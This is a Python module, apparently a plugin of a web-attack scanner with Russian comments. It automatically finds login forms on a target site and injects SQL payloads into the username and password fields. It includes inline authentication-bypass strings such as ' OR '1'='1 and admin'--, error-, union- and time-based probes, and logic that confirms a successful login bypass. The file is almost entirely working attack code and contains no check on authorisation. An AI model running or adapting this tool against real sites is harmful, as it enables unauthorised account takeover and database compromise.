"""sqli_post v5 — sniper: 40 curated payloads + auto-discover login forms"""
import re
import time
from urllib.parse import urljoin, urlparse
from core.http import HttpClient
from core.sniper_payloads import SNIPER_SQLI


# Признаки успеха логина
SUCCESS_MARKERS = [
    "logout", "sign out", "sign-out", "log out", "dashboard", "my account",
    "welcome", "administrator", "admin panel", "profile",
]

# Поля логина
USER_FIELDS = ["uid", "username", "user", "email", "login", "uname", "account"]
PASS_FIELDS = ["passw", "password", "pass", "pwd", "passwd", "secret"]

# Error markers (расширенный)
ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlstate",
    "unclosed quotation", "quoted string", "syntax error",
    "jdbc", "java.sql", "odbc", "microsoft ole db",
    "xpath syntax", "double value out of range", "extractvalue",
    "updatexml", "utl_inaddr", "invalid input syntax",
]


class SqliPost:
    def run(self, session, logger):
        target = session.target
        base_url = target.split("?")[0] if "?" in target else target
        http = HttpClient(session, logger)

        print(f"[sqli_post v5] sniper mode")
        print(f"[sqli_post v5] target: {base_url}")

        # 1. discover forms
        forms = self._discover_forms(http, base_url)
        if not forms:
            print("[sqli_post v5] no login forms found")
            return {"findings": []}

        print(f"[sqli_post v5] found {len(forms)} forms:")
        for f in forms:
            print(f"  {f['action']} fields={f['user_field']}/{f['pass_field']}")
        print()

        findings = []

        for form in forms:
            action = form["action"]
            user_field = form["user_field"]
            pass_field = form["pass_field"]
            url = urljoin(base_url, action)

            print(f"[form] {url}")
            print(f"  fields: {user_field} / {pass_field}")

            # baseline
            base_data = {user_field: "x_test_user", pass_field: "x_test_pass"}
            base = http.post(url, data=base_data)
            if not base:
                print(f"  x no response")
                continue

            base_success = self._has_success(base)
            base_len = len(base.content)
            base_time = self._baseline_time_post(http, url, base_data, samples=2)
            print(f"  baseline: {base.status_code} {base_len}b avg={base_time:.2f}s success={base_success}")

            # Test each field with all sniper probes
            for field in [user_field, pass_field]:
                print(f"  [field: {field}]")
                field_found = False

                # Группируем probes по типу для последовательного теста
                by_type = {
                    "error": [p for p in SNIPER_SQLI if p["type"] == "error"],
                    "bypass": [],  # bypass отдельно
                    "union": [p for p in SNIPER_SQLI if p["type"] == "union"],
                    "time": [p for p in SNIPER_SQLI if p["type"] == "time"],
                    "boolean": [p for p in SNIPER_SQLI if p["type"] == "boolean"],
                }

                # Bypass-проверка: специальные payload'ы
                BYPASS = [
                    ("bypass_or_1_1", "' OR '1'='1"),
                    ("bypass_admin_comment", "admin'--"),
                    ("bypass_or_num", "' OR 1=1--"),
                ]
                for bp_name, bp in BYPASS:
                    if base_success:
                        continue
                    data = {user_field: "admin", pass_field: "x"}
                    data[field] = bp
                    r = http.post(url, data=data, allow_redirects=True)
                    if r and self._has_success(r):
                        print(f"    ✓ [{bp_name}] BYPASS")
                        findings.append({"field": field, "name": bp_name,
                                         "payload": bp, "type": "auth_bypass"})
                        logger.finding("sqli_post_bypass", "critical",
                                       f"{field}={bp[:30]}")
                        field_found = True
                        break

                if field_found:
                    continue

                # Error + union + time probes
                for probe in by_type["error"] + by_type["union"]:
                    pname = probe["name"]
                    payload = probe["payload"]
                    ptype = probe["type"]

                    data = {user_field: "admin", pass_field: "x"}
                    data[field] = payload

                    t0 = time.time()
                    r = http.post(url, data=data, allow_redirects=True)
                    dt = time.time() - t0
                    if not r:
                        continue

                    low = r.text.lower()

                    # error
                    if ptype == "error":
                        for m in ERROR_MARKERS:
                            if m in low:
                                print(f"    ✓ [{pname}] ERROR → {m[:40]}")
                                findings.append({
                                    "field": field, "name": pname,
                                    "payload": payload, "type": "error",
                                    "marker": m, "dbms": probe["dbms"],
                                })
                                logger.finding("sqli_post_error", "high",
                                               f"{field} {pname}: {m[:40]}")
                                field_found = True
                                break

                    # union
                    elif ptype == "union":
                        diff = len(r.content) - base_len
                        if abs(diff) > 50:
                            print(f"    ✓ [{pname}] UNION diff={diff:+d}b")
                            findings.append({
                                "field": field, "name": pname,
                                "payload": payload, "type": "union",
                                "diff": diff, "dbms": probe["dbms"],
                            })
                            logger.finding("sqli_post_union", "high",
                                           f"{field} {pname} diff={diff}")
                            field_found = True
                            break

                    if field_found:
                        break

                if field_found:
                    continue

                # Time probes (медленные — только если ничего не нашли)
                for probe in by_type["time"]:
                    pname = probe["name"]
                    payload = probe["payload"]

                    data = {user_field: "admin", pass_field: "x"}
                    data[field] = payload

                    t0 = time.time()
                    r = http.post(url, data=data, allow_redirects=True)
                    dt = time.time() - t0

                    if dt > base_time + 2.5:
                        print(f"    ✓ [{pname}] TIME delay={dt:.2f}s")
                        findings.append({
                            "field": field, "name": pname,
                            "payload": payload, "type": "time",
                            "delay": round(dt, 2), "dbms": probe["dbms"],
                        })
                        logger.finding("sqli_post_time", "high",
                                       f"{field} {pname} delay={dt:.2f}s")
                        field_found = True
                        break

            # verify if any bypass/error found
            if findings:
                print(f"  [verify] повторная проверка")
                first = findings[0]
                data = {user_field: "admin", pass_field: "x"}
                data[first["field"]] = first["payload"]
                r = http.post(url, data=data, allow_redirects=True)
                if r:
                    low = r.text.lower()
                    verified = (
                        (first["type"] == "auth_bypass" and self._has_success(r)) or
                        (first["type"] == "error" and any(m in low for m in ERROR_MARKERS))
                    )
                    if verified:
                        print(f"    ✓ VERIFIED")
                        first["verified"] = True
                        logger.finding("sqli_post_verified", "critical",
                                       f"verified on {action}")

        print()
        print(f"[sqli_post v5] findings: {len(findings)}")
        return {"findings": findings}

    def _discover_forms(self, http, base_url):
        paths = ["", "/login", "/login.jsp", "/signin", "/admin", "/admin/login",
                 "/user/login", "/auth/login", "/doLogin"]
        forms = []

        for path in paths:
            url = base_url.rstrip("/") + path if path else base_url
            r = http.get(url)
            if not r or r.status_code != 200:
                continue

            for m in re.finditer(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.S):
                form_html = m.group(0)
                action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
                action = action_m.group(1) if action_m else url
                fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
                fields = [f for f in fields if f.lower() not in ("submit", "btnsubmit", "btn", "button")]

                uf = pf = None
                for f in fields:
                    low = f.lower()
                    if any(k in low for k in PASS_FIELDS): pf = f
                    elif any(k in low for k in USER_FIELDS): uf = f
                if uf and pf:
                    action_key = (action, uf, pf)
                    if action_key not in [(f["action"], f["user_field"], f["pass_field"]) for f in forms]:
                        forms.append({"action": action, "user_field": uf, "pass_field": pf,
                                      "fields": fields})

        return forms

    def _baseline_time_post(self, http, url, data, samples=2):
        times = []
        for _ in range(samples):
            t0 = time.time()
            http.post(url, data=data)
            times.append(time.time() - t0)
            time.sleep(0.15)
        return sum(times) / len(times) if times else 0.5

    def _has_success(self, response):
        loc = response.headers.get("Location", "")
        if loc and any(k in loc.lower() for k in ["main", "dashboard", "account", "profile", "bank"]):
            return True
        if loc and "login" in loc.lower():
            return False

        set_cookie = response.headers.get("Set-Cookie", "")
        if set_cookie and any(k in set_cookie.lower() for k in ["session", "auth", "token", "sid"]):
            text = response.text.lower()[:2000]
            if "type=\"password\"" not in text:
                return True

        text = response.text.lower()[:3000]
        for m in SUCCESS_MARKERS:
            if m in text and "type=\"password\"" not in text:
                return True
        return False
